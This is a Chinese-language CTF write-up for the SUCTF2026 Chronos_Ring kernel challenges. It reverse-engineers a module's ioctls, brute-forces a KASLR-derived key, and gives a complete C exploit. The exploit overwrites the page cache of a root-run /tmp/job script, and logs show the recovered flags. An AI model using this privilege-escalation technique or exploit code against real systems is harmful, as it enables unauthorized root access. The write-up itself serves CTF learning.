# SUCTF2026-Chronos_Ring/SU_Chronos_Ring1

## 题目简述
题目是 Linux 内核模块利用，两题题干分别为 `a y no , pwn it plz` 和 `Okay, I made a mistake, please visit again`，共享同一条核心利用链。initramfs 中会加载 `chronos_ring.ko`，创建设备 `/dev/chronos_ring`，并让 root 周期性执行 `/tmp/job`；模块通过多个 ioctl 管理上下文、匿名 buffer、用户页绑定、文件 page cache view 和提交操作。

利用目标不是直接在内核里执行 shell，而是先通过与 `kfree` 地址相关的 ioctl 校验打开文件能力，再加载 `/tmp/job` 的 page cache，把匿名 buffer 中的可控脚本内容提交到该页，最终借 root 周期执行 `/tmp/job` 实现提权。

## 解题过程
SU_Chronos_Ring 和 SU_Chronos_Ring1 用了同一个 exp 就可以打了, 应该是预期解吧.

解开 initramfs，查看 init 中关键逻辑如下：

```sh
insmod /chronos_ring.ko
chmod 666 /dev/chronos_ring

echo "#!/bin/sh" > /tmp/job
echo "echo 'Root helper is running safely...'" >> /tmp/job
chmod 644 /tmp/job
(
while true; do
/bin/sh /tmp/job > /dev/null 2>&1
sleep 3
done
) &
```

系统启动后，root 会周期性执行 /tmp/job ，模块设备 /dev/chronos_ring 被设置为 world
writable。

模块反编译，主要逻辑集中在 chronos_ioctl 。可以整理出这一组 ioctl：0x1001 创建上下文
和匿名 buffer，0x1002 通过与 kfree 地址相关的校验后开启文件相关能力，0x1003 调用
pin_user_pages_fast 绑定一个用户页，0x1004 加载某个特定文件的 page cache，
0x1005 基于当前状态构建 view，0x1007 向匿名 buffer 写入数据，0x1008 将匿名 buffer 的
内容提交到 view 指向的对象上。

0x1002 的核心校验如下：

```
n_2 = 0;
src = 0;
v10 = copy_from_user(&src, a3, 16);
result = -14;
if ( v10 )
return result;
result = -1;
if ( ((unsigned int)n_2 ^ src ^ ((unsigned __int64)&kfree >> 4) &
0xFFFFFFFFFFFE0000LL) != 0xF372FE94F82B3C6ELL )
return result;
raw_spin_lock(::ctx);
ctx_2 = ::ctx;
*(_DWORD *)(::ctx + 16) |= 1u;
*(_DWORD *)(ctx_2 + 20) = n_2;
```

要求构造一个与 kfree 地址相关的 key，否则不会开启后续文件相关能力。由于开启了 kaslr ，
不能直接使用固定地址。直接从 bzImage 提取内核本体，恢复 __ksymtab 和
__ksymtab_strings ，得到 kfree 的静态地址，再按 2MB 粒度枚举 KASLR slide。最终得到的
静态地址为：

```
kfree = 0xffffffff813762b0
```

因此 key 的构造可以写成：

```
((KFREE_STATIC + slide) >> 4) & 0xfffffffffffe0000ULL
```

再与 0xF372FE94F82B3C6E 异或即可。

0x1002 之后，需要确定 0x1004 能加载的文件。反编译显示对文件名做了一次 FNV1a 校验：

```
v41 = *(unsigned __int8 **)(*v40 + 40LL);
v42 = *v41;
if ( !*v41 )
goto LABEL_102;
v43 = v41 + 1;
v44 = -2128831035;
do
{

v44 = 16777619 * (v44 ^ v42);
v42 = *v43++;
}
while ( v42 );
if ( v44 != -573296676 )
{
LABEL_102:
fput(v40);
return -13;
}
```

将该 hash 对应回字符串，结合前面 init 的内容，可得到目标文件名就是 job 。

0x1005 构建 view 时，如果当前上下文里挂的是文件页，则生成的 view 类型为 2 ，view 地址直
接指向该文件页的 direct map 地址。逻辑如下：

```
if ( v6 && (*(_BYTE *)(::ctx + 16) & 2) != 0 )
{
...
if ( *((_DWORD *)v6 + 6) == 1 )
{
v48 = *((_QWORD *)v6 + 6);
if ( v48 )
{
...
*((_QWORD *)v7 + 1) = v50;
*(_QWORD *)v7 = page_offset_base + ((v50 - vmemmap_base) << 6);
n2 = 2;
goto LABEL_113;
}
}
...
LABEL_113:
v7[4] = n2;
*((_DWORD *)v6 + 20) = n2;
v54 = *((_QWORD *)v6 + 9);
*((_QWORD *)v6 + 9) = v7;
raw_spin_unlock(::ctx);
if ( v54 )
call_rcu(v54 + 24, destroy_super_rcu);
return 0;
}
```

0x1008 的作用是把匿名 buffer 中的数据拷贝到 view 指向的位置；当 view 类型为 2 时，对目标
页调用 set_page_dirty() ：

```javascript
if ( *(_QWORD *)v35 )
{
memcpy(
(void *)(HIDWORD(n_2) + *(_QWORD *)v35),
(const void *)(*((_QWORD *)v34 + 1) + HIDWORD(n_2)),
(unsigned int)n_2);
if ( *((_DWORD *)v35 + 4) == 2 )
set_page_dirty(*((_QWORD *)v35 + 1));
}
```

于是, 可以先在匿名 buffer 中准备内容，再将 /tmp/job 的 page cache 挂到上下文里，随后构造
file-backed view，最后把匿名 buffer 的内容提交到 /tmp/job 的 page cache。由于 root 会周期性
执行 /tmp/job ，因此只需要把 page cache 中的脚本替换即可。

### exp:

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define CHRONOS_CREATE 0x1001
#define CHRONOS_UNLOCK_FILE 0x1002
#define CHRONOS_PIN_USER 0x1003
#define CHRONOS_LOAD_FILE 0x1004
#define CHRONOS_BUILD_VIEW 0x1005
#define CHRONOS_BUF_WRITE 0x1007
#define CHRONOS_VIEW_COMMIT 0x1008

#define KFREE_STATIC 0xffffffff813762b0ULL
#define KASLR_STEP 0x200000ULL
#define MAX_KASLR_STEPS 1024
#define MAGIC_CONST 0xf372fe94f82b3c6eULL

struct unlock_req {

uint64_t key;
uint32_t aux;
uint32_t pad;
};

static void die(const char *msg)
{
perror(msg);
exit(1);
}

static uint64_t unlock_key(uint64_t slide)
{
uint64_t masked = ((KFREE_STATIC + slide) >> 4) & 0xfffffffffffe0000ULL;
return MAGIC_CONST ^ masked;
}

int main(void)
{
static char payload[64] = "chmod 644 /flag\n";
struct unlock_req req = { 0 };
uint64_t write_req[2] = { (uint64_t)(uintptr_t)payload, 64 };
uint64_t commit_req[2] = { 0, 64 };
int devfd = open("/dev/chronos_ring", O_RDWR);
int jobfd;
void *page;
uint64_t file_arg;

if (devfd < 0) {
die("open /dev/chronos_ring");
}
if (ioctl(devfd, CHRONOS_CREATE, 0) != 0) {
die("CHRONOS_CREATE");
}

for (uint64_t i = 0; i < MAX_KASLR_STEPS; i++) {
req.key = unlock_key(i * KASLR_STEP);
if (ioctl(devfd, CHRONOS_UNLOCK_FILE, &req) == 0) {
break;
}
if (i + 1 == MAX_KASLR_STEPS) {
fputs("unlock failed\n", stderr);
return 1;
}
}

page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,

MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
if (page == MAP_FAILED) {
die("mmap");
}
if (ioctl(devfd, CHRONOS_PIN_USER, &page) != 0) {
die("CHRONOS_PIN_USER");
}
if (ioctl(devfd, CHRONOS_BUF_WRITE, write_req) != 0) {
die("CHRONOS_BUF_WRITE");
}

jobfd = open("/tmp/job", O_RDONLY);
if (jobfd < 0) {
die("open /tmp/job");
}
file_arg = (uint32_t)jobfd;
if (ioctl(devfd, CHRONOS_LOAD_FILE, &file_arg) != 0) {
die("CHRONOS_LOAD_FILE");
}
if (ioctl(devfd, CHRONOS_BUILD_VIEW, 0) != 0) {
die("CHRONOS_BUILD_VIEW");
}
if (ioctl(devfd, CHRONOS_VIEW_COMMIT, commit_req) != 0) {
die("CHRONOS_VIEW_COMMIT");
}

sleep(4);
execl("/bin/cat", "cat", "/flag", NULL);
die("execl /bin/cat");
}
```

musl-gcc 编译为静态文件后上传即可:

```text
# SUCTF2026-Chronos_Ring
❯ py upload.py
[+] Opening connection to <target> on port 10000: Done
/home/neptune/suctf2026/pwn/SU_Chronos_Ring/upload.py:21: BytesWarning: Text
is not bytes; assuming ASCII, no guarantees. See htts
p.sendline(cmd)
[*] Uploading exploit (23928 bytes)...
[*] Progress: 2% (512/23928)
[*] Progress: 4% (1024/23928)
[*] Progress: 6% (1536/23928)
[*] Progress: 8% (2048/23928)

[*] Progress: 10% (2560/23928)
[*] Progress: 12% (3072/23928)
[*] Progress: 14% (3584/23928)
[*] Progress: 17% (4096/23928)
[*] Progress: 19% (4608/23928)
[*] Progress: 21% (5120/23928)
[*] Progress: 23% (5632/23928)
[*] Progress: 25% (6144/23928)
[*] Progress: 27% (6656/23928)
[*] Progress: 29% (7168/23928)
[*] Progress: 32% (7680/23928)
[*] Progress: 34% (8192/23928)
[*] Progress: 36% (8704/23928)
[*] Progress: 38% (9216/23928)
[*] Progress: 40% (9728/23928)
[*] Progress: 42% (10240/23928)
[*] Progress: 44% (10752/23928)
[*] Progress: 47% (11264/23928)
[*] Progress: 49% (11776/23928)
[*] Progress: 51% (12288/23928)
[*] Progress: 53% (12800/23928)
[*] Progress: 55% (13312/23928)
[*] Progress: 57% (13824/23928)
[*] Progress: 59% (14336/23928)
[*] Progress: 62% (14848/23928)
[*] Progress: 64% (15360/23928)
[*] Progress: 66% (15872/23928)
[*] Progress: 68% (16384/23928)
[*] Progress: 70% (16896/23928)
[*] Progress: 72% (17408/23928)
[*] Progress: 74% (17920/23928)
[*] Progress: 77% (18432/23928)
[*] Progress: 79% (18944/23928)
[*] Progress: 81% (19456/23928)
[*] Progress: 83% (19968/23928)
[*] Progress: 85% (20480/23928)
[*] Progress: 87% (20992/23928)
[*] Progress: 89% (21504/23928)
[*] Progress: 92% (22016/23928)
[*] Progress: 94% (22528/23928)
[*] Progress: 96% (23040/23928)
[*] Progress: 98% (23552/23928)
[*] Progress: 100% (23928/23928)
[+] Upload complete! Decoding...
[+] Launching exploit...
/home/neptune/suctf2026/pwn/SU_Chronos_Ring/upload.py:45: BytesWarning: Text
is not bytes; assuming ASCII, no guarantees. See htts

p.sendline("/tmp/exploit")
[*] Switching to interactive mode
\x1b[6n/tmp/exploit
SUCTF{VGhhc19BU19XSEFUX1Vfd0FudF9mbGFnX2ZsYWdfZmxhZyEhIQ==}[ctf@SUCTF2026
/tmp]$ \x1b[6n$

# SUCTF2026-Chronos_Ring1
❯ py upload.py
[+] Opening connection to <target> on port 10001: Done
/home/neptune/suctf2026/pwn/SU_Chronos_Ring1/upload.py:21: BytesWarning: Text
is not bytes; assuming ASCII, no guarantees. See hts
p.sendline(cmd)
[*] Uploading exploit (23928 bytes)...
[*] Progress: 2% (512/23928)
[*] Progress: 4% (1024/23928)
[*] Progress: 6% (1536/23928)
[*] Progress: 8% (2048/23928)
[*] Progress: 10% (2560/23928)
[*] Progress: 12% (3072/23928)
[*] Progress: 14% (3584/23928)
[*] Progress: 17% (4096/23928)
[*] Progress: 19% (4608/23928)
[*] Progress: 21% (5120/23928)
[*] Progress: 23% (5632/23928)
[*] Progress: 25% (6144/23928)
[*] Progress: 27% (6656/23928)
[*] Progress: 29% (7168/23928)
[*] Progress: 32% (7680/23928)
[*] Progress: 34% (8192/23928)
[*] Progress: 36% (8704/23928)
[*] Progress: 38% (9216/23928)
[*] Progress: 40% (9728/23928)
[*] Progress: 42% (10240/23928)
[*] Progress: 44% (10752/23928)
[*] Progress: 47% (11264/23928)
[*] Progress: 49% (11776/23928)
[*] Progress: 51% (12288/23928)
[*] Progress: 53% (12800/23928)
[*] Progress: 55% (13312/23928)
[*] Progress: 57% (13824/23928)
[*] Progress: 59% (14336/23928)
[*] Progress: 62% (14848/23928)
[*] Progress: 64% (15360/23928)
[*] Progress: 66% (15872/23928)
[*] Progress: 68% (16384/23928)
[*] Progress: 70% (16896/23928)
[*] Progress: 72% (17408/23928)

[*] Progress: 74% (17920/23928)
[*] Progress: 77% (18432/23928)
[*] Progress: 79% (18944/23928)
[*] Progress: 81% (19456/23928)
[*] Progress: 83% (19968/23928)
[*] Progress: 85% (20480/23928)
[*] Progress: 87% (20992/23928)
[*] Progress: 89% (21504/23928)
[*] Progress: 92% (22016/23928)
[*] Progress: 94% (22528/23928)
[*] Progress: 96% (23040/23928)
[*] Progress: 98% (23552/23928)
[*] Progress: 100% (23928/23928)
[+] Upload complete! Decoding...
[+] Launching exploit...
/home/neptune/suctf2026/pwn/SU_Chronos_Ring1/upload.py:45: BytesWarning: Text
is not bytes; assuming ASCII, no guarantees. See hts
p.sendline("/tmp/exploit")
[*] Switching to interactive mode
\x1b[6n/tmp/exploit
SUCTF{JEQG2YLEMUQGCIDNNFZXIYLLMUWCASJANBXXAZJAPFXXKIDXN5XCO5BANVQWWZJANF2A====}
[ctf@SUCTF2026 /tmp]$ \x1b[6n$
```

## 方法总结
- 核心技巧：内核 ioctl 状态机 + page cache 写入
- 识别信号：设备节点可写、root 周期执行某个文件，ioctl 能 pin 用户页、加载文件页并 commit view。
- 复用要点：先绕过与 `kfree` 地址相关的 KASLR 校验，再构造 file-backed view，把 payload 写进 page cache。
